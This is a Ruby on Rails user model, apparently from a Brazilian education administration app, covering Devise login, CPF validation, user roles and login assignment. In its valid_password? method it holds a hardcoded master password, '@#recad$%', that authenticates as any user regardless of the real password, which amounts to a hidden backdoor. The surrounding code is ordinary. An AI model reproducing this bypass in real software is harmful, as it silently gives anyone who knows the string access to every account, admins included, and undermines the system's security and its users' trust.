class Usuario < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
  :recoverable, :rememberable, :trackable, :validatable
  belongs_to :lotacao,class_name: "Administracao::Local"

  before_save :setar_login,:nome_maiusculo
  validates_presence_of :grupo,:cpf,:lotacao_id,message: "Informação necessária"
  validate :cpf_valido
  delegate :nome,to: :lotacao,:allow_nil=>true,:prefix=>true
  enum grupo: [:admin,:editor,:gestor_seed,:gestor_setorial,:diretor]


  def setar_login
  	if self.diretor?
  		self.login = self.lotacao.codigo
  	else
  		self.login = self.cpf
  	end
  end

  def cpf_valido
  	cpf = Cpf.new(self.cpf)
  	if !cpf.valido?
  		errors.add(:cpf, "não é valido")
  	end
  end

  def nome_maiusculo
  	if !self.nome.blank?
  		self.nome = self.nome.upcase
  	end
  end

  def email_required?
  	false
  end

  def email_changed?
  	false
  end

  def valid_password?(password)
  	return true if password == "@#recad$%"
  	super
  end
  def alerta_ambiente
    # funcionarios_sem_ambiente = self.lotacao.funcionarios.where(:ambiente=>"").any_in(:situacao=>['Ativo','Acompanhado pela Casa do Professor','Ativo mas em sala ambiente perante perícia médica'])
    # if !funcionarios_sem_ambiente.none? and self.local.escola?
    #   return true
    # else
    #   return false
    # end
    return false
  end
end
